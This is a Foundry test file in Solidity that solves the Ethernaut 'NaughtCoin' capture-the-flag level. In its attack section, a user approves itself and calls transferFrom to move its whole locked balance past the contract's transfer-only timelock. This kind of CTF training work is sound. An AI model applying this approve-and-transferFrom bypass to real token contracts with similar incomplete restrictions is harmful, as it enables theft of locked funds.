// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/15-NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address user1 = vm.addr(1);
    address user2 = vm.addr(2);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(user1);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_uint("user1 balance before exploit", ethernautNaughtCoin.balanceOf(user1));
        uint256 amount = ethernautNaughtCoin.balanceOf(user1);
        ethernautNaughtCoin.approve(user1, amount);
        ethernautNaughtCoin.transferFrom(user1, user2, amount);
        emit log_named_uint("user1 balance after exploit", ethernautNaughtCoin.balanceOf(user1));
        assertEq(ethernautNaughtCoin.balanceOf(user1), 0, "user1 balance is greater than 0!");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}